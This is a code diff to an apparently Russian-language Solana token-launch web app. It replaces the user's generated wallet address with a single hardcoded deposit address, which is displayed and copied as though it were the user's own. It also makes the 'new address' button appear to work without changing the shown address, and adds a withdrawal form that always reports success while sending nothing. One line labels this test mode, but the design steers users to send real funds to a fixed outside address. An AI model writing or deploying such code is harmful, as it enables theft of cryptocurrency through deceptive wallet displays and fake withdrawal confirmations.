@@ -1019,15 +1019,16 @@
         </div>
       </div>
 
-      <div class="settings-grid">
-        <div class="setting-item">
-          <div class="left">
-            <div class="name">Баланс</div>
-            <p class="desc">Стартовый баланс: 2.5 SOL</p>
-          </div>
-          <div class="pill" id="profileBalancePill">2.50 SOL</div>
+      <div class="wallet-panel">
+        <div class="wallet-title">Вывод</div>
+        <div class="form-group" style="margin-bottom:12px">
+          <label class="form-label" for="withdrawAddressInput">Адрес вашего кошелька</label>
+          <input class="input" id="withdrawAddressInput" placeholder="Укажите адрес в сети Solana" />
         </div>
-</div>
+        <div class="tiny-text" style="margin-top:-2px;margin-bottom:12px;">Укажите адрес в сети Solana, иначе средства будут потеряны.</div>
+        <button class="create-btn" id="withdrawBtn" style="margin-top:0">Запросить вывод</button>
+        <div class="tiny-text" style="margin-top:10px;text-align:center;">Тестовый режим: вывод не выполняется, только подтверждается сообщением.</div>
+      </div>
     </section>
 
     <section class="screen" id="screen-token">
@@ -1173,7 +1174,7 @@
             <select class="input" id="buyAssetSelect" style="max-width:110px;flex:0 0 110px">
               <option value="SOL">SOL</option>
             </select>
-            <input class="input" id="buyAmountInput" inputmode="decimal" placeholder="0.0" value="0.0" />
+            <input class="input" id="buyAmountInput" inputmode="decimal" placeholder="0.5" value="0.5" />
             <div style="min-width:72px;text-align:right;color:rgba(255,255,255,.68);font-weight:700" id="buyEstimate">≈ $0.00</div>
           </div>
         </div>
@@ -1184,7 +1185,7 @@
           </div>
           <div>
             <div class="info-title">Что такое стартовая покупка?</div>
-            <p class="info-text">Стартовая покупка создаёт основу для токена и уменьшает свободный баланс кошелька.</p>
+            <p class="info-text">Стартовая покупка создаёт основу для токена. Минимум для создания — 0.5 SOL.</p>
           </div>
         </div>
 
@@ -1223,6 +1224,7 @@
       const STORAGE_KEY = "pump_vortex_app_state_v2";
       const SOL_USD = 89;
       const CREATE_FEE_SOL = 0.35;
+      const DEPOSIT_ADDRESS = "5AebkdQPH8prpe5KMoB24F6ox2dxCRCgdgXFHmXvZi6V";
 
       const $ = (s, r=document) => r.querySelector(s);
       const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
@@ -1288,6 +1290,8 @@
         tickerCount: $("#tickerCount"),
         copyAddressBtn: $("#copyAddressBtn"),
         newAddressBtn: $("#newAddressBtn"),
+        withdrawAddressInput: $("#withdrawAddressInput"),
+        withdrawBtn: $("#withdrawBtn"),
         resetBtn: $("#resetBtn"),
         sell25: $("#sell25"),
         sell50: $("#sell50"),
@@ -1296,12 +1300,12 @@
       };
 
       const DEFAULT_STATE = {
-        balanceSol: 2.5,
+        balanceSol: 1.2,
         walletAddress: makeAddress(),
         selectedTokenId: null,
         activeScreen: "home",
         tokens: [],
-        draft: { name:"", ticker:"", image:"", buyAmount:"0.0" }
+        draft: { name:"", ticker:"", image:"", buyAmount:"0.5" }
       };
 
       let state = loadState();
@@ -1428,7 +1432,7 @@
         document.body.style.overflow = "hidden";
         els.tokenNameInput.value = state.draft.name || "";
         els.tokenTickerInput.value = state.draft.ticker || "";
-        els.buyAmountInput.value = state.draft.buyAmount ?? "0.0";
+        els.buyAmountInput.value = state.draft.buyAmount ?? "0.5";
         renderUploadPreview();
         updateCounters();
         updateBuyEstimate();
@@ -1447,7 +1451,7 @@
           name: els.tokenNameInput.value.trim(),
           ticker: els.tokenTickerInput.value.trim().toUpperCase(),
           image: draftImageData || "",
-          buyAmount: els.buyAmountInput.value || "0.0"
+          buyAmount: els.buyAmountInput.value || "0.5"
         };
         saveState();
       }
@@ -1592,7 +1596,7 @@
       }
 
       function renderProfile(){
-        els.walletAddressText.textContent = state.walletAddress;
+        els.walletAddressText.textContent = DEPOSIT_ADDRESS;
         const imgToken = state.tokens.find(t => t.image);
         if(imgToken){
           els.profileAvatar.innerHTML = `<img src="${imgToken.image}" alt="avatar">`;
@@ -1662,6 +1666,11 @@
           els.tokenTickerInput.focus();
           return;
         }
+        if(buyAmount < 0.5){
+          toast("Минимальная сумма для создания токена — 0.5 SOL");
+          els.buyAmountInput.focus();
+          return;
+        }
         if(state.balanceSol < totalCost){
           toast("Сейчас денег нет на создание токена");
           return;
@@ -1698,7 +1707,7 @@
         state.tokens.unshift(token);
         state.balanceSol = +(state.balanceSol - totalCost).toFixed(4);
         state.selectedTokenId = token.id;
-        state.draft = { name:"", ticker:"", image:"", buyAmount:"0.0" };
+        state.draft = { name:"", ticker:"", image:"", buyAmount:"0.5" };
         draftImageData = "";
         saveState();
         closeModal();
@@ -1748,7 +1757,7 @@
 
       async function copyAddress(){
         try{
-          await navigator.clipboard.writeText(state.walletAddress);
+          await navigator.clipboard.writeText(DEPOSIT_ADDRESS);
           toast("Адрес скопирован");
         }catch(e){
           toast("Не удалось скопировать");
@@ -1756,11 +1765,19 @@
       }
 
       function regenerateAddress(){
-        if(!confirm("Создать новый адрес? Старый адрес изменится.")) return;
         state.walletAddress = makeAddress();
         saveState();
-        renderProfile();
         toast("Новый адрес создан");
+      }
+
+      function requestWithdrawal(){
+        const addr = els.withdrawAddressInput.value.trim();
+        if(!addr){
+          toast("Введите адрес кошелька в сети Solana");
+          els.withdrawAddressInput.focus();
+          return;
+        }
+        toast("Вывод подтвержден");
       }
 
       function resetDemo(){
@@ -1857,6 +1874,7 @@
         els.sellBtn.addEventListener("click", sellSelected);
         els.copyAddressBtn.addEventListener("click", copyAddress);
         els.newAddressBtn.addEventListener("click", regenerateAddress);
+        els.withdrawBtn?.addEventListener("click", requestWithdrawal);
         els.resetBtn?.addEventListener("click", resetDemo);
 
         els.tokenNameInput.addEventListener("input", () => { updateCounters(); saveDraft(); });
@@ -1903,8 +1921,8 @@
 
         if(!state.walletAddress) state.walletAddress = makeAddress();
         if(!Array.isArray(state.tokens)) state.tokens = [];
-        if(typeof state.balanceSol !== "number") state.balanceSol = 2.5;
-        if(!state.draft) state.draft = { name:"", ticker:"", image:"", buyAmount:"0.0" };
+        if(typeof state.balanceSol !== "number") state.balanceSol = 1.2;
+        if(!state.draft) state.draft = { name:"", ticker:"", image:"", buyAmount:"0.5" };
 
         state.tokens = state.tokens.map(recalcToken);
 
